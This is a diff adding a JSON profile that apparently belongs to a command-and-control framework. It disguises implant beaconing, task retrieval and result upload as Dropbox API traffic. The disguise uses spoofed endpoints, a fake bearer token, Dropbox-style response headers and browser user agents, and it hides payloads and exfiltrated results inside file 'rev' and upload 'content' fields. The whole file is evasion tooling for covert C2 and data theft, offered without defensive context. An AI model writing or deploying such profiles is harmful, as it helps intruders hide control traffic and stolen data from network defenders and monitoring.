@@ -1,0 +1,66 @@
+{
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+  "linux_user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+
+  "beacon_path":  "/2/files/list_folder",
+  "tasks_path":   "/2/files/list_folder/continue",
+  "results_path": "/2/files/upload_session/append",
+
+  "extra_headers": {
+    "Accept": "application/json",
+    "Authorization": "Bearer sl.B0000000000000000000000000000000000000000000000"
+  },
+  "request_headers": {
+    "results": {
+      "Content-Type": "application/octet-stream"
+    }
+  },
+
+  "response_headers": {
+    "Server": "envoy",
+    "X-Dropbox-Request-Id": "0000000000000000000000000000000"
+  },
+
+  "shaping": {
+    "checkin_response": {
+      "template": {
+        "entries": [
+          {
+            ".tag": "file",
+            "name": "{{nonce}}.dat",
+            "id": "id:{{nonce}}",
+            "rev": "{{payload}}"
+          }
+        ],
+        "cursor": "{{nonce}}",
+        "has_more": false
+      },
+      "extract": "entries[0].rev"
+    },
+    "tasks_response": {
+      "template": {
+        "entries": [
+          {
+            ".tag": "file",
+            "name": "tasks-{{nonce}}.dat",
+            "id": "id:{{nonce}}",
+            "rev": "{{payload}}"
+          }
+        ],
+        "cursor": "{{nonce}}",
+        "has_more": false
+      },
+      "extract": "entries[0].rev"
+    },
+    "results_request": {
+      "template": {
+        "cursor": {
+          "session_id": "{{nonce}}",
+          "offset": 0
+        },
+        "content": "{{payload}}"
+      },
+      "extract": "content"
+    }
+  }
+}
